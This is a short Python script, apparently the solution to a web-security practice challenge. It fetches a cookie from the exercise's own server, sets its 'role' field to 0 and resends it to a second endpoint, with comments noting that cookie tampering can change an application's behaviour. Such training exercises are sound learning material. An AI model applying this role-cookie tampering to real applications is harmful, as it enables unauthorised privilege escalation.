### Challenge 03
#Send a GET request with a modified cookie to URL.
#Use User-Agent `pythonidae`.
#Modify cookie and set `role` to 0.
### Test
#Access the following URL.
#```
#https://pythonidae.herokuapp.com/web/cookies
#```
#set `role` to 0, then sent the cookie as GET request to
#```
#https://pythonidae.herokuapp.com/web-api/modify
#```
### Remarks
#Cookies are still used to passed information on stateless HTTP. Often, cookies store parameter to the system. By modifying it, we might be able to change the behavior of the application.


import requests 

url1 = 'https://pythonidae.herokuapp.com/web/cookies'
url2 = 'https://pythonidae.herokuapp.com/web-api/modify'
headers = {'user-agent':'pythonidae'}


res1 = requests.get(url1, headers=headers)
print(res1.text)
cookies = res1.cookies
print(cookies)
for cookie in cookies:
    if cookie.name == 'role':
        cookie.value = '0'
    cookie.path = '/web-api'


print(cookies)
res2 = requests.get(url2, headers=headers, cookies=cookies)

print(res2)
